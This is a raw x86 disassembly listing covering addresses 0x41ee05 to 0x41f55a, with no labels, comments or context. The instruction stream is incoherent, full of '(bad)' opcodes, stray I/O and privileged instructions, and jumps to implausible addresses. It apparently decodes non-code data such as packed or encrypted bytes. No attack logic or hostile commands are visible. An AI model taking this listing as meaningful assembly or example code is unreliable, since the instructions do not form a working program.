  41ee05:	lods   eax,DWORD PTR ds:[esi]
  41ee06:	cs loopne 0x41ee5b
  41ee09:	(bad)  
  41ee0a:	mov    ah,0x3b
  41ee0c:	nop
  41ee0d:	jns    0x41edf7
  41ee0f:	pushf  
  41ee10:	dec    edx
  41ee11:	shl    DWORD PTR [ebp-0x337f82fa],0xc3
  41ee18:	inc    ebx
  41ee19:	jb     0x41eddb
  41ee1b:	mov    ebx,0xf5f950aa
  41ee20:	xchg   BYTE PTR [esp+ebp*8],bh
  41ee23:	fbstp  TBYTE PTR [esi]
  41ee25:	push   edi
  41ee26:	in     eax,dx
  41ee27:	into   
  41ee28:	in     al,0xbe
  41ee2a:	add    esp,esp
  41ee2c:	stos   BYTE PTR es:[edi],al
  41ee2d:	fadd   st(1),st
  41ee2f:	inc    ebx
  41ee30:	add    esp,DWORD PTR [ebp+0x71]
  41ee33:	ret    
  41ee34:	test   bh,al
  41ee36:	loope  0x41ede7
  41ee38:	mul    BYTE PTR [eax-0x22]
  41ee3b:	or     al,0x4b
  41ee3d:	or     DWORD PTR [edi+0x5e],esp
  41ee40:	dec    edi
  41ee42:	daa    
  41ee43:	mov    ds:0x4bb4b199,al
  41ee48:	jo     0x41edd7
  41ee4a:	cdq    
  41ee4b:	sub    ebp,esi
  41ee4d:	cmp    cl,ch
  41ee4f:	mov    edx,DWORD PTR [esi-0x4b]
  41ee52:	fwait
  41ee53:	jns    0x41eeca
  41ee55:	out    0x2,eax
  41ee57:	outs   dx,DWORD PTR ds:[esi]
  41ee58:	retf   0x30c2
  41ee5b:	pop    esp
  41ee5c:	mov    bh,0xf1
  41ee5e:	clc    
  41ee5f:	inc    esp
  41ee60:	sbb    eax,0x8f65312b
  41ee65:	fmul   DWORD PTR [ebx-0x1f]
  41ee68:	cmp    al,BYTE PTR [ebx+ebx*1]
  41ee6b:	in     eax,dx
  41ee6c:	mov    esp,0x2dcf753a
  41ee71:	ret    0x6fba
  41ee74:	adc    eax,0x82afeb0f
  41ee79:	shr    BYTE PTR [ecx+0x47],0xdd
  41ee7d:	jecxz  0x41eed8
  41ee7f:	xlat   BYTE PTR ds:[ebx]
  41ee80:	mov    edi,0x8f73f361
  41ee85:	mov    edx,0x9ee02668
  41ee8a:	jp     0x41ee50
  41ee8c:	inc    BYTE PTR [ecx+0x601a84ec]
  41ee92:	inc    ebx
  41ee93:	jne    0x41eecc
  41ee95:	xlat   BYTE PTR ds:[ebx]
  41ee96:	jne    0x41ef09
  41ee98:	outs   dx,DWORD PTR ds:[esi]
  41ee99:	aas    
  41ee9a:	mov    DWORD PTR [eax],ebp
  41ee9c:	mov    al,0xd7
  41ee9e:	pop    es
  41ee9f:	push   ss
  41eea0:	enter  0x2d7f,0x7
  41eea4:	shl    DWORD PTR [edi-0x24d80402],1
  41eeaa:	test   dl,bl
  41eeac:	cmp    bl,ah
  41eeae:	sub    al,0x26
  41eeb0:	cld    
  41eeb1:	push   0xb
  41eeb3:	xor    ch,BYTE PTR [ecx+0x1a]
  41eeb6:	fstp   TBYTE PTR [ecx]
  41eeb8:	pop    ss
  41eeb9:	dec    edx
  41eeba:	ins    BYTE PTR es:[edi],dx
  41eebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eebc:	dec    ebp
  41eebd:	xor    bh,BYTE PTR [edi-0x46]
  41eec0:	or     al,0xea
  41eec2:	loopne 0x41ee4b
  41eec4:	jo     0x41ef07
  41eec6:	or     DWORD PTR [edx],esi
  41eec8:	les    eax,FWORD PTR [ebp+0x613c5a06]
  41eece:	xchg   ecx,eax
  41eecf:	or     DWORD PTR [eax],esp
  41eed1:	xchg   esi,eax
  41eed2:	or     al,0x13
  41eed4:	cmp    ebp,edi
  41eed6:	sbb    bl,cl
  41eed8:	repnz fwait
  41eeda:	pop    edi
  41eedb:	add    DWORD PTR ss:[eax],0x25abad84
  41eee2:	mov    ch,al
  41eee4:	and    BYTE PTR [ecx+0x4e5103bb],ah
  41eeea:	pop    edi
  41eeeb:	mov    ebp,0x1b9e1424
  41eef0:	add    cl,dh
  41eef2:	mov    al,es:0x4d301ef6
  41eef8:	inc    ebx
  41eef9:	pushf  
  41eefa:	and    BYTE PTR gs:[edi-0x47],dh
  41eefe:	mov    eax,ds:0xc873dad0
  41ef03:	loopne 0x41ef04
  41ef05:	jne    0x41eea5
  41ef07:	pop    esp
  41ef08:	xchg   edi,eax
  41ef09:	and    DWORD PTR [ebx-0x37],eax
  41ef0c:	and    ch,cl
  41ef0e:	(bad)  
  41ef0f:	jne    0x41ef3e
  41ef11:	xor    DWORD PTR [edx+0x1a],edi
  41ef14:	push   ds
  41ef15:	xchg   esp,eax
  41ef16:	sub    dh,BYTE PTR [eax-0x6179c8a7]
  41ef1c:	adc    BYTE PTR [ebx+0x45],al
  41ef1f:	in     al,dx
  41ef20:	fcomp  st(2)
  41ef22:	dec    esp
  41ef23:	adc    BYTE PTR [esi],dh
  41ef25:	cmp    DWORD PTR [ebx],esi
  41ef27:	mov    WORD PTR [eax],cs
  41ef29:	adc    DWORD PTR ds:0x2bf7023a,edi
  41ef2f:	adc    ecx,esp
  41ef31:	mov    edi,0x335fdfa8
  41ef36:	and    BYTE PTR [eax],al
  41ef38:	sbb    eax,0xbe8cc567
  41ef3d:	scas   eax,DWORD PTR es:[edi]
  41ef3e:	loop   0x41ef32
  41ef40:	(bad)  
  41ef41:	out    0x2d,eax
  41ef43:	arpl   bp,bx
  41ef45:	call   0x49021c2c
  41ef4a:	jne    0x41ef02
  41ef4c:	call   0x35cca788
  41ef51:	pop    es
  41ef52:	or     BYTE PTR [esi-0x23],cl
  41ef55:	mov    ds:0xf0868a34,eax
  41ef5a:	add    al,0x8a
  41ef5c:	mov    dh,0x50
  41ef5e:	xchg   esi,edx
  41ef60:	sbb    edx,DWORD PTR [edi-0xd88cec1]
  41ef66:	cmp    eax,0x95cf85a
  41ef6b:	(bad)  
  41ef6d:	setp   cl
  41ef70:	repnz dec edx
  41ef72:	shl    DWORD PTR [esi+edx*8],0x83
  41ef76:	xor    BYTE PTR [ecx-0x1fe0277b],0xa4
  41ef7d:	push   esi
  41ef7e:	(bad)  
  41ef7f:	xchg   edi,eax
  41ef80:	ret    0x369a
  41ef83:	push   esi
  41ef84:	cmp    al,0xeb
  41ef86:	pop    esi
  41ef87:	jne    0x41ef4e
  41ef89:	and    dh,BYTE PTR [ecx]
  41ef8b:	jno    0x41efcc
  41ef8d:	ins    BYTE PTR es:[edi],dx
  41ef8e:	sub    bh,dl
  41ef90:	cmp    DWORD PTR [edi+0x1813b80c],ebx
  41ef96:	dec    ecx
  41ef97:	cmp    al,0x3d
  41ef99:	adc    al,0x14
  41ef9b:	pop    es
  41ef9c:	dec    ebx
  41ef9d:	cli    
  41ef9e:	pop    edi
  41ef9f:	inc    esi
  41efa0:	and    bl,0xfb
  41efa3:	adc    esp,ebx
  41efa5:	fldcw  WORD PTR [eax]
  41efa7:	mov    ch,0x9c
  41efa9:	out    dx,eax
  41efaa:	push   cs
  41efab:	pusha  
  41efac:	push   eax
  41efad:	xchg   esp,eax
  41efae:	fbld   TBYTE PTR [eax-0x213fd2ab]
  41efb4:	mov    bp,0x7072
  41efb8:	add    eax,0xe813dbc2
  41efbd:	cmp    DWORD PTR [edi],eax
  41efbf:	and    DWORD PTR [edx-0x4e],esi
  41efc2:	mov    bh,0x17
  41efc4:	pop    ds
  41efc5:	jbe    0x41efa7
  41efc7:	sbb    DWORD PTR [ebp-0x34608e79],edx
  41efcd:	and    edx,DWORD PTR [esi+0x6a86a76d]
  41efd3:	mov    eax,0x5e7e207f
  41efd8:	push   esi
  41efd9:	adc    al,0x9e
  41efdb:	loope  0x41efe6
  41efdd:	xlat   BYTE PTR ds:[ebx]
  41efde:	xchg   esp,eax
  41efdf:	dec    edx
  41efe0:	pop    ebx
  41efe1:	mov    eax,DWORD PTR [edx]
  41efe3:	outs   dx,BYTE PTR ds:[esi]
  41efe4:	int3   
  41efe5:	clc    
  41efe6:	push   0x41
  41efe8:	mov    ebp,?
  41efea:	xchg   bh,bl
  41efec:	mov    eax,ds:0x77dc6476
  41eff1:	dec    ebp
  41eff2:	ret    
  41eff3:	in     al,dx
  41eff4:	mov    ch,0x76
  41eff6:	or     DWORD PTR [ebp-0x78140c5d],edi
  41effc:	pop    edx
  41effd:	jno    0x41efca
  41efff:	addr16 call 0x6731:0xed41cd4a
  41f007:	bound  esi,QWORD PTR [ebx-0x60]
  41f00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f00b:	push   0x20df046
  41f010:	push   ecx
  41f011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f012:	sub    al,0x81
  41f014:	outs   dx,BYTE PTR ds:[esi]
  41f015:	or     ah,bh
  41f017:	xor    BYTE PTR [edi],ch
  41f019:	dec    edx
  41f01a:	jns    0x41efe5
  41f01c:	pop    es
  41f01d:	ja     0x41f026
  41f01f:	xchg   DWORD PTR [ecx-0x40],esi
  41f022:	test   al,al
  41f024:	sbb    eax,0x53a90b23
  41f029:	and    BYTE PTR [ebx-0x48],dh
  41f02c:	dec    esp
  41f02d:	cmp    BYTE PTR [ecx+0x7c],dl
  41f030:	pop    esi
  41f031:	adc    al,BYTE PTR [esi+ebp*4]
  41f034:	mov    ds:0x90114845,al
  41f039:	mov    al,es:0x9a203592
  41f03f:	and    eax,eax
  41f041:	inc    edx
  41f042:	adc    al,BYTE PTR [esi]
  41f044:	push   ecx
  41f045:	push   ds
  41f046:	ins    BYTE PTR es:[edi],dx
  41f047:	push   0xc899c4c0
  41f04c:	je     0x41f0b0
  41f04e:	(bad)  
  41f04f:	loopne 0x41f013
  41f051:	xor    al,bl
  41f053:	bound  edx,QWORD PTR [ecx-0x71]
  41f056:	push   es
  41f057:	call   0xcd878f2b
  41f05c:	mov    al,ds:0x2df7b54f
  41f061:	cs mov al,0xab
  41f064:	pop    esp
  41f065:	pop    esp
  41f066:	adc    esp,DWORD PTR [eax]
  41f068:	push   0xbaf934b7
  41f06d:	cwde   
  41f06e:	sahf   
  41f06f:	xor    ch,BYTE PTR [eax]
  41f071:	sub    BYTE PTR [edi-0x5a],0xd0
  41f075:	mov    ah,0x48
  41f077:	test   eax,0x6adb6248
  41f07c:	dec    edi
  41f07d:	or     edi,DWORD PTR [ebp+ecx*8+0x6c]
  41f081:	push   eax
  41f082:	pop    ebp
  41f083:	push   ecx
  41f084:	clc    
  41f085:	or     edi,DWORD PTR [ecx]
  41f087:	pop    ebp
  41f088:	lea    ebx,[edx+0x3ba937f7]
  41f08e:	fiadd  DWORD PTR [ebx+0x5deb18c8]
  41f094:	mov    bh,0xd5
  41f096:	es jae 0x41f045
  41f099:	test   al,dl
  41f09b:	sahf   
  41f09c:	shl    BYTE PTR [edi+0x23],0x8f
  41f0a0:	xchg   ecx,eax
  41f0a1:	mov    ebx,0x85bf48b9
  41f0a6:	lods   eax,DWORD PTR ds:[esi]
  41f0a7:	call   0x6021:0x616526f
  41f0ae:	hlt    
  41f0af:	cwde   
  41f0b0:	xchg   BYTE PTR [ebx+0x100d5a73],bl
  41f0b6:	add    eax,0x73d2025b
  41f0bb:	out    0x37,eax
  41f0bd:	mov    ebp,0x71a811f7
  41f0c2:	jns    0x41f087
  41f0c4:	xchg   DWORD PTR [edx],esi
  41f0c6:	adc    DWORD PTR [ecx],esp
  41f0c8:	popa   
  41f0c9:	or     cl,BYTE PTR [ebx+ebx*4+0x67]
  41f0cd:	into   
  41f0ce:	jge    0x41f097
  41f0d0:	inc    edx
  41f0d1:	mov    BYTE PTR [edx+0x79],cl
  41f0d4:	aad    0x5d
  41f0d6:	inc    edi
  41f0d7:	jns    0x41f05f
  41f0d9:	cmpxchg DWORD PTR [edx+0x51],edx
  41f0dd:	cs (bad) 
  41f0df:	mov    DWORD PTR [ebp-0x533ee350],edx
  41f0e5:	(bad)  
  41f0e6:	and    al,0x50
  41f0e8:	call   0xcf9434a
  41f0ed:	mov    ebp,0xb9c3a63
  41f0f2:	daa    
  41f0f3:	pop    edx
  41f0f4:	mov    ebx,0x6cff6e2c
  41f0f9:	sbb    esp,DWORD PTR [edi+0x71]
  41f0fc:	and    edi,eax
  41f0fe:	ret    0x5a96
  41f101:	rcl    cl,1
  41f103:	enter  0xc4b,0x7f
  41f107:	dec    eax
  41f108:	pop    esp
  41f109:	jg     0x41f08e
  41f10b:	cmp    eax,0x5c43d7c9
  41f110:	js     0x41f0f7
  41f112:	push   eax
  41f113:	push   esi
  41f114:	(bad)  
  41f115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f117:	cmp    eax,DWORD PTR [edx-0x7916890c]
  41f11d:	mov    BYTE PTR [ebx+0x4528babd],bh
  41f123:	jle    0x41f152
  41f125:	aam    0xe2
  41f127:	adc    DWORD PTR [eax-0x35],ebx
  41f12a:	lds    ecx,FWORD PTR ds:0x3fababd
  41f130:	retf   0x3537
  41f133:	leave  
  41f134:	stos   BYTE PTR es:[edi],al
  41f135:	ds pop eax
  41f137:	and    DWORD PTR [esi-0x14d1f2ec],edi
  41f13d:	add    ah,0x3f
  41f140:	and    bl,bl
  41f142:	jo     0x41f19a
  41f144:	sbb    ch,BYTE PTR [ebx-0x8]
  41f147:	cwde   
  41f148:	popf   
  41f149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f14a:	aaa    
  41f14b:	lea    ecx,[edi+edi*4-0x6b9537]
  41f152:	fsubr  QWORD PTR [eax+0xf961bbc]
  41f158:	push   0x49
  41f15a:	js     0x41f1b6
  41f15c:	js     0x41f150
  41f15e:	inc    esi
  41f15f:	adc    BYTE PTR [edx],0x80
  41f162:	fldenv [ecx-0x22]
  41f165:	xor    esi,esp
  41f167:	inc    eax
  41f168:	cdq    
  41f169:	mov    edx,DWORD PTR ds:0x72870c33
  41f16f:	jne    0x41f1da
  41f171:	bnd jb 0x41f1e9
  41f174:	mov    bl,0x89
  41f176:	iret   
  41f177:	jecxz  0x41f1e0
  41f179:	(bad)  
  41f17a:	retf   
  41f17b:	test   ch,0x37
  41f17e:	xchg   ebx,eax
  41f17f:	and    ch,dh
  41f181:	sub    ah,dl
  41f183:	je     0x41f1ad
  41f185:	clc    
  41f186:	stc    
  41f187:	les    ebp,FWORD PTR [esi+eiz*2-0x4d]
  41f18b:	adc    DWORD PTR ds:0xda1d3e4a,eax
  41f191:	fwait
  41f192:	mov    ebp,0xf7209303
  41f197:	or     ecx,DWORD PTR [edi]
  41f199:	pop    ss
  41f19a:	adc    BYTE PTR [eax-0x11],0x6
  41f19e:	hlt    
  41f19f:	push   0xffffffb7
  41f1a1:	scas   eax,DWORD PTR es:[edi]
  41f1a2:	fbstp  TBYTE PTR [esi+0x6b0a4845]
  41f1a8:	sub    BYTE PTR [edx],0xcf
  41f1ab:	lods   al,BYTE PTR ds:[esi]
  41f1ac:	ret    
  41f1ad:	xor    DWORD PTR [eax+0x42],edx
  41f1b0:	cdq    
  41f1b1:	xchg   eax,esi
  41f1b3:	or     bl,BYTE PTR [ebp-0x574dce6a]
  41f1b9:	pusha  
  41f1ba:	push   0xf3d102bd
  41f1bf:	sub    al,0xa6
  41f1c1:	test   ah,ch
  41f1c3:	cwde   
  41f1c4:	jp     0x41f1c2
  41f1c6:	and    al,BYTE PTR [ecx]
  41f1c8:	adc    ebx,DWORD PTR [edx]
  41f1ca:	mov    al,0x1d
  41f1cc:	pop    ds
  41f1cd:	nop
  41f1ce:	mov    DWORD PTR [ebp+esi*2+0x47],eax
  41f1d2:	sub    ah,BYTE PTR [ecx+0x584cf0a8]
  41f1d8:	pop    edx
  41f1d9:	fisubr DWORD PTR [edx+eiz*1+0x3f]
  41f1dd:	jmp    FWORD PTR [ebx]
  41f1df:	je     0x41f1a5
  41f1e1:	jecxz  0x41f1f4
  41f1e3:	test   al,0x82
  41f1e5:	or     DWORD PTR [esi-0x3],esp
  41f1e8:	push   ebx
  41f1e9:	repnz or DWORD PTR [eax+0x15],esi
  41f1ed:	lock push es
  41f1ef:	dec    DWORD PTR [edi-0x24d386b1]
  41f1f5:	retf   0xca8a
  41f1f8:	sub    BYTE PTR [edi],cl
  41f1fa:	dec    ecx
  41f1fb:	pop    ebx
  41f1fc:	pop    esp
  41f1fd:	jp     0x41f22f
  41f1ff:	loop   0x41f1b2
  41f201:	or     esp,DWORD PTR [edx+0x734d21f6]
  41f207:	pop    ecx
  41f208:	ins    BYTE PTR es:[edi],dx
  41f209:	call   FWORD PTR [ecx-0x29733dd6]
  41f20f:	sub    bp,ax
  41f212:	sbb    eax,0x333ec8aa
  41f217:	inc    edx
  41f218:	aas    
  41f219:	ja     0x41f1c2
  41f21b:	mov    edi,0xe57ae66c
  41f220:	mov    al,BYTE PTR [esi+0x1f]
  41f223:	(bad)  
  41f224:	mov    bl,0xbe
  41f226:	inc    eax
  41f227:	gs cs inc esi
  41f22a:	mov    bh,BYTE PTR [edx-0x142a3120]
  41f230:	mov    ebp,0xdc3e3c5
  41f235:	pop    ecx
  41f236:	push   0x37
  41f238:	fwait
  41f239:	cmp    al,0xab
  41f23b:	lods   al,BYTE PTR ds:[esi]
  41f23c:	rol    BYTE PTR [ebx],0x37
  41f23f:	sub    eax,DWORD PTR fs:[edx+0x3d04e1f4]
  41f246:	push   ebx
  41f247:	shr    DWORD PTR ds:0xb4379593,1
  41f24d:	js     0x41f294
  41f24f:	clc    
  41f250:	shl    BYTE PTR [ecx+0xd],0x29
  41f254:	nop
  41f255:	ficom  DWORD PTR [eax-0x2ab40417]
  41f25b:	add    esi,ebp
  41f25d:	or     al,0x45
  41f25f:	add    ebp,DWORD PTR [ecx-0x5cdabdd9]
  41f265:	fstp   QWORD PTR [edi-0x1fd8e7d9]
  41f26b:	popa   
  41f26c:	sub    eax,0x125fb650
  41f271:	cld    
  41f272:	jle    0x41f2bd
  41f274:	icebp  
  41f275:	xchg   ecx,eax
  41f276:	iret   
  41f277:	div    eax
  41f279:	adc    al,0x64
  41f27b:	jne    0x41f2d9
  41f27d:	or     edx,esp
  41f27f:	mov    esp,ecx
  41f281:	imul   eax,DWORD PTR [ebx+0x75],0x6f524005
  41f288:	dec    esi
  41f289:	outs   dx,DWORD PTR ds:[esi]
  41f28a:	jae    0x41f2d4
  41f28c:	mov    ah,0xf
  41f28e:	or     eax,0xa6734788
  41f293:	pushf  
  41f294:	mov    esp,0x87fe1ef7
  41f299:	cli    
  41f29a:	rcl    BYTE PTR [eax-0x7],1
  41f29d:	sub    eax,0xb005f8ae
  41f2a2:	(bad)  [eax]
  41f2a4:	ror    DWORD PTR [ebx-0x58175167],0x3
  41f2ab:	and    DWORD PTR [esi],eax
  41f2ad:	add    dh,ch
  41f2af:	inc    eax
  41f2b0:	mov    ebx,0x3fd150a2
  41f2b5:	inc    BYTE PTR [edi+0x8]
  41f2b8:	push   edi
  41f2b9:	ret    0x6fef
  41f2bc:	std    
  41f2bd:	cwde   
  41f2be:	imul   ebx,DWORD PTR [eax+0x7d2ff5de],0x73
  41f2c5:	shr    ecx,cl
  41f2c7:	jp     0x41f28c
  41f2c9:	push   esi
  41f2cb:	fldenv [ecx-0x46edb5a5]
  41f2d1:	push   eax
  41f2d2:	cmp    bl,dl
  41f2d4:	jmp    0x5b9d4179
  41f2d9:	sbb    edx,DWORD PTR [eax+0x55380ee2]
  41f2df:	add    ebp,DWORD PTR [edx]
  41f2e1:	adc    dh,BYTE PTR [esp+eiz*4+0xf4c4f42]
  41f2e8:	sub    eax,0x371cb654
  41f2ed:	push   ds
  41f2ee:	xor    al,0xa7
  41f2f0:	sub    BYTE PTR [ecx-0x79768317],dh
  41f2f6:	(bad)  
  41f2f7:	enter  0x41fe,0xe7
  41f2fb:	add    ebx,DWORD PTR [eax]
  41f2fd:	cmp    ch,al
  41f2ff:	cmp    dl,BYTE PTR [esp+esi*4-0xa327cef]
  41f306:	retf   
  41f307:	aas    
  41f308:	mov    ebp,0x50dddfb9
  41f30d:	rcr    bl,cl
  41f30f:	pop    edx
  41f310:	clc    
  41f311:	stc    
  41f312:	cmc    
  41f313:	inc    ebp
  41f314:	lock clc 
  41f316:	retf   
  41f317:	sbb    DWORD PTR [ecx+0x33db2fa9],edi
  41f31d:	and    esi,ecx
  41f31f:	or     eax,0x27dabcd7
  41f324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f325:	pushf  
  41f326:	xlat   BYTE PTR ds:[ebx]
  41f327:	or     DWORD PTR ds:0xd3287b44,esi
  41f32d:	retf   
  41f32e:	gs cmp eax,0x7c49823e
  41f334:	cmc    
  41f335:	pop    esi
  41f336:	sti    
  41f337:	mov    al,0x55
  41f339:	imul   edi,DWORD PTR [edx+0x3d7c17d0],0xffffff85
  41f340:	xchg   edx,edx
  41f342:	or     al,bl
  41f344:	xor    al,0x3a
  41f346:	or     esp,DWORD PTR [edx+esi*8]
  41f349:	popf   
  41f34a:	outs   dx,DWORD PTR ds:[esi]
  41f34b:	arpl   WORD PTR [edi],bx
  41f34d:	mov    al,0x56
  41f34f:	inc    bl
  41f351:	sub    BYTE PTR [edx+0x75],bl
  41f354:	sbb    eax,0xf8d5292
  41f359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f35a:	repz dec DWORD PTR [eax-0x7d]
  41f35e:	arpl   WORD PTR [eax],dx
  41f360:	mov    al,ds:0xb8e1e006
  41f365:	dec    ecx
  41f366:	ins    BYTE PTR es:[edi],dx
  41f367:	sbb    BYTE PTR [ecx-0x14],ch
  41f36a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f36b:	xor    dh,BYTE PTR [eax+ebx*1]
  41f36e:	mov    ebx,0x48e88cc
  41f373:	or     BYTE PTR [eax-0x36a58791],0x2a
  41f37a:	retf   
  41f37b:	sbb    eax,0x77f7dbd8
  41f380:	fnstsw WORD PTR [ecx+0x3bf5da9]
  41f386:	shl    DWORD PTR [esi+0x3d],0xe6
  41f38a:	adc    al,0xbb
  41f38c:	xchg   ebx,eax
  41f38d:	and    dl,BYTE PTR [ebp+ebx*8-0x358f560a]
  41f394:	lods   eax,DWORD PTR ds:[esi]
  41f395:	jnp    0x41f3d8
  41f397:	sub    DWORD PTR [ebx+eax*4+0x18],ecx
  41f39b:	out    0x3f,al
  41f39d:	clc    
  41f39e:	iret   
  41f39f:	jnp    0x41f330
  41f3a1:	fwait
  41f3a2:	(bad)  
  41f3a3:	out    0xeb,al
  41f3a5:	fucom  st(7)
  41f3a7:	xchg   ecx,eax
  41f3a8:	nop
  41f3a9:	pop    eax
  41f3aa:	xlat   BYTE PTR ds:[ebx]
  41f3ab:	push   edi
  41f3ac:	retf   
  41f3ad:	mov    ah,0x7
  41f3af:	rcr    DWORD PTR [edx+0xe],cl
  41f3b2:	or     al,0xaa
  41f3b4:	pop    ss
  41f3b5:	in     eax,0x8a
  41f3b7:	push   ds
  41f3b8:	out    0x89,eax
  41f3ba:	es pop edx
  41f3bc:	fild   DWORD PTR [esi]
  41f3be:	mov    es,WORD PTR [eax-0x42]
  41f3c1:	xchg   ebp,esp
  41f3c3:	xchg   edx,eax
  41f3c4:	jns    0x41f43b
  41f3c6:	nop
  41f3c7:	adc    al,0x7a
  41f3c9:	or     dl,BYTE PTR [eax-0x2c9071b4]
  41f3cf:	neg    DWORD PTR [ecx]
  41f3d1:	jo     0x41f447
  41f3d3:	retf   
  41f3d4:	dec    eax
  41f3d5:	jnp    0x41f41f
  41f3d7:	sahf   
  41f3d8:	inc    eax
  41f3d9:	stos   DWORD PTR es:[edi],eax
  41f3da:	fwait
  41f3db:	inc    eax
  41f3dc:	xchg   edx,eax
  41f3dd:	scas   eax,DWORD PTR es:[edi]
  41f3de:	sti    
  41f3df:	dec    edi
  41f3e0:	mov    al,ds:0x51ac4480
  41f3e5:	nop
  41f3e6:	or     al,ch
  41f3e8:	fistp  QWORD PTR [eax+0x1a6d96f7]
  41f3ee:	add    DWORD PTR [ebp-0x45dee9a2],0x0
  41f3f5:	cdq    
  41f3f6:	test   eax,0x6969525e
  41f3fb:	sub    dh,bh
  41f3fd:	mov    ch,0xb3
  41f3ff:	pushf  
  41f400:	dec    esp
  41f401:	cmp    edx,ebx
  41f403:	inc    eax
  41f404:	gs inc edi
  41f406:	in     al,dx
  41f407:	not    ah
  41f409:	dec    BYTE PTR [esp+eiz*2+0x41]
  41f40d:	pop    ebx
  41f40e:	fwait
  41f40f:	pop    ebx
  41f410:	sbb    al,0xa7
  41f412:	aas    
  41f413:	and    esp,ebx
  41f415:	push   ecx
  41f416:	lahf   
  41f417:	(bad)  
  41f418:	cld    
  41f419:	jg     0x41f476
  41f41b:	test   al,0xd7
  41f41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f41e:	ins    DWORD PTR es:[edi],dx
  41f41f:	push   ss
  41f420:	mov    ebx,edx
  41f422:	cmp    DWORD PTR [ebp+0x25c2f4e3],edx
  41f428:	enter  0xa4bd,0x66
  41f42c:	jb     0x41f465
  41f42e:	pop    es
  41f42f:	dec    ecx
  41f430:	(bad)  
  41f431:	sub    BYTE PTR [ebp-0x2befbb75],al
  41f437:	aas    
  41f438:	cs sti 
  41f43a:	popf   
  41f43b:	inc    eax
  41f43c:	mov    bh,BYTE PTR [ebx-0x100bca11]
  41f442:	int3   
  41f443:	sbb    BYTE PTR [ebx+0x1c011032],0x80
  41f44a:	push   esp
  41f44b:	pop    ds
  41f44c:	hlt    
  41f44d:	mov    ss,WORD PTR [ebx+0x789ef721]
  41f453:	or     DWORD PTR ds:0xdfeb4534,0x996cfef3
  41f45d:	outs   dx,DWORD PTR ds:[esi]
  41f45e:	(bad)  
  41f45f:	aam    0x54
  41f461:	pushf  
  41f462:	or     al,0x42
  41f464:	mov    esi,DWORD PTR [ecx-0xbd4853]
  41f46a:	das    
  41f46b:	xchg   ebx,eax
  41f46c:	and    cl,ch
  41f46e:	retf   0x4326
  41f471:	std    
  41f472:	pop    esp
  41f473:	xchg   ecx,eax
  41f474:	shr    DWORD PTR [edx-0x15],1
  41f477:	jmp    0xc0e7:0x8d1cad1e
  41f47e:	or     ebx,DWORD PTR [ecx*8+0x38d57ca0]
  41f485:	add    ch,ah
  41f487:	jno    0x41f4a5
  41f489:	pop    ebx
  41f48a:	push   ds
  41f48b:	mov    eax,0xd58ee447
  41f490:	ret    
  41f491:	push   eax
  41f492:	js     0x41f427
  41f494:	add    BYTE PTR [eax],bl
  41f496:	stos   DWORD PTR es:[edi],eax
  41f497:	mov    ebp,0x175e9046
  41f49c:	xlat   BYTE PTR ds:[ebx]
  41f49d:	repz test eax,0x6065e69
  41f4a3:	mov    ebx,0xd040ceb4
  41f4a8:	dec    ecx
  41f4a9:	int3   
  41f4aa:	or     cl,BYTE PTR [edi-0x46]
  41f4ad:	inc    ecx
  41f4ae:	cmp    eax,0xc4cf31e9
  41f4b3:	push   ecx
  41f4b4:	push   eax
  41f4b5:	in     eax,0x2
  41f4b7:	xor    BYTE PTR [edi],dh
  41f4b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4ba:	(bad)  
  41f4bb:	out    0x13,eax
  41f4bd:	gs xor bl,dl
  41f4c0:	pop    ecx
  41f4c1:	rcl    edx,cl
  41f4c3:	sub    eax,0x63044053
  41f4c8:	jno    0x41f53c
  41f4ca:	in     al,dx
  41f4cb:	scas   al,BYTE PTR es:[edi]
  41f4cc:	inc    ebp
  41f4cd:	into   
  41f4ce:	sbb    edx,ecx
  41f4d0:	shl    BYTE PTR [edx+0x5df5252b],0x9b
  41f4d7:	dec    edx
  41f4d8:	icebp  
  41f4d9:	rol    DWORD PTR [ebx],cl
  41f4db:	outs   dx,DWORD PTR ds:[esi]
  41f4dc:	sub    al,0x9
  41f4de:	mov    ebx,0xf2a1c619
  41f4e4:	data16 sub cl,al
  41f4e7:	mov    cl,BYTE PTR [ebx]
  41f4e9:	adc    esp,0xf00d6da7
  41f4ef:	add    eax,0xf326a216
  41f4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f5:	and    dl,cl
  41f4f7:	jnp    0x41f4c1
  41f4f9:	push   eax
  41f4fa:	dec    esp
  41f4fb:	mov    dl,0x14
  41f4fd:	xchg   edx,eax
  41f4fe:	jo     0x41f548
  41f500:	sbb    al,0x6e
  41f502:	stos   BYTE PTR es:[edi],al
  41f503:	jg     0x41f515
  41f505:	cld    
  41f506:	mov    edx,0xbfe8b2e9
  41f50b:	lar    esp,di
  41f50e:	adc    eax,0xf085366
  41f513:	xchg   ebp,eax
  41f514:	inc    ebx
  41f515:	push   ds
  41f516:	in     al,0x28
  41f518:	ins    DWORD PTR es:[edi],dx
  41f519:	pop    edx
  41f51a:	fidiv  WORD PTR [edx-0x3b782ca0]
  41f520:	test   BYTE PTR [esi],bl
  41f522:	fnstcw WORD PTR [ebx+0x11aa8867]
  41f528:	mov    ch,0xe3
  41f52a:	sbb    DWORD PTR [ecx],0x18
  41f52d:	or     DWORD PTR [ebx],ebx
  41f52f:	call   DWORD PTR [esi+0x3ebed711]
  41f535:	cli    
  41f536:	or     eax,0xfedb5db3
  41f53b:	inc    esi
  41f53c:	jo     0x41f575
  41f53e:	ret    0xce49
  41f541:	shl    DWORD PTR [ebp-0x2dc8c6b8],cl
  41f547:	sti    
  41f548:	xchg   ecx,eax
  41f549:	aaa    
  41f54a:	ins    BYTE PTR es:[edi],dx
  41f54b:	ror    BYTE PTR ds:0x8b018ec4,0x1b
  41f552:	and    al,0xf6
  41f554:	sbb    BYTE PTR [edx+0x21],ch
  41f557:	or     eax,DWORD PTR [eax]
  41f559:	inc    ebx
  41f55a:	ja     0x41f5db
